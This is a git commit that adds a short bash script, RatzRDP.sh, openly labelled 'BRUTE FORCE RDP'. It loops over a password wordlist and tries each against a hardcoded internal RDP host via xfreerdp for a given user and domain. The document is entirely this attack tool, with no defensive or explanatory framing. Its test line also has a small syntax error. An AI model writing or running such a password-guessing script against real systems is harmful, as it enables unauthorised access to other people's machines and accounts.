4b9d425d5a44c581bffde9a0cce3596f95d81577
Harley Araújo <harleyjm.araujo@gmail.com>
2018-02-19 04:41:11 -0300

    Add files via upload

---
+++ RatzRDP.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+if [ "$1" == ""]
+then
+echo " BRUTE FORCE RDP - Lil D1x"
+echo "$0 User Domain wordlist.txt"
+else
+for pass in $(cat $3);
+do
+echo "Testing Password: $pass"
+xfreerdp /u:$1 /d:$2 /p:$pass /v:172.16.1.60 /w:800 /h:600;
+done
+
+
